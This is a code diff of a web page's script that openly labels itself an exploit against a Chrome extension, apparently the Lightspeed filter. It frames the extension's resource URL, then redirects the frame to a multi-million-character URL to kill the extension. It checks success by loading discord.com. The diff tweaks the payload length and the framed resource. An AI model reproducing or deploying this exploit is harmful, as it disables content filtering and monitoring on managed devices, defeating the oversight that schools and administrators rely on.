@@ -77,7 +77,7 @@
     </style>
     <script>
 	
-	window.onload = checkForExtension;
+
 	    
 	function hanger() {
     	    let overlay = document.createElement("div");
@@ -119,13 +119,13 @@
     	    overlay.appendChild(hanging);
     	    document.body.appendChild(overlay);
 
-    	    let extURL = "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/options.html";
+    	    let extURL = "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon_64.png";
     	    let extFrame = document.createElement("iframe");
     	    extFrame.src = extURL;
     	    document.body.appendChild(extFrame);
     
     	    setTimeout(function () { // Exploit function which creates an iframe pointing to lightspeed's web accessible url and then redirects it to a 2 million digit long URI
-        	let killURL = "https://" + "e".repeat(2000000);
+        	let killURL = "https://" + "e".repeat(2500000);
         	extFrame.src = killURL;
         	setTimeout(function () {
             	    document.body.removeChild(extFrame);
@@ -227,7 +227,7 @@
 
 	    function checkKilled() {
         	const iframe = document.createElement("iframe");
-        	iframe.src = "about:blank"; // Attempts loading a blank page to see if lightspeed has been killed
+        	iframe.src = "https://discord.com"; // Attempts loading a blank page to see if lightspeed has been killed
         	iframe.style.width = "1px";
         	iframe.style.height = "1px";
         	iframe.style.position = "absolute";
